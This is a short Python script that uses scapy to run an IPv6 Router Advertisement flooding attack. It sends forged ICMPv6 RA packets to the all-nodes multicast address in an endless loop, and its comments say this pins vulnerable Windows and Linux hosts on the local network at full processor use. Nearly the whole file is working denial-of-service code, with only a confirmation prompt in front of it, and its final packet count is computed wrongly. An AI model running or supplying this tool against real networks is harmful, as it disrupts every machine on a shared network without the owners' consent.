from scapy.all import *

#
# This is not patched by Microsoft.  Windows 7 and 8 are vulnerable, as well as a handful of (U|L)inux boxes.
# IPv6 NDP was designed to replace the DHCP protocol.  When a system picks up an ICMPv6 Router Advertisement,
# it is essentially forcing the system to update their local networking information for the new router.  This
# DoS's the system's IPv6 networking.  When the network is flooded with these ICMPv6 RA's, the system's are hosed
# at 100% processor usage as they scramble to update routing tables, address info, etc. 
# More on this attack: http://www.mh-sec.de/downloads/mh-RA_flooding_CVE-2010-multiple.txt
#
def initialize():
	tmp = raw_input('[!] WARNING: This will NDP DoS the entire local network.  Is this correct? ') 
	if 'n' in tmp.lower(): 
		return

	conf.verb = 0
	count = 0

	print '[!] Starting Router Advertisement...'

	# build the forged packet
	pkt = IPv6(dst='ff02::1')
	pkt /= ICMPv6ND_RA()
	pkt /= ICMPv6NDOptPrefixInfo(prefixlen=64,prefix='ba11:a570::')

	# start DoSing...
	try:
		send(pkt, loop=1, inter=0.1)
		count += 1
	except:
		pass
	print '[+] Done.  Sent %d advertisements.'%count
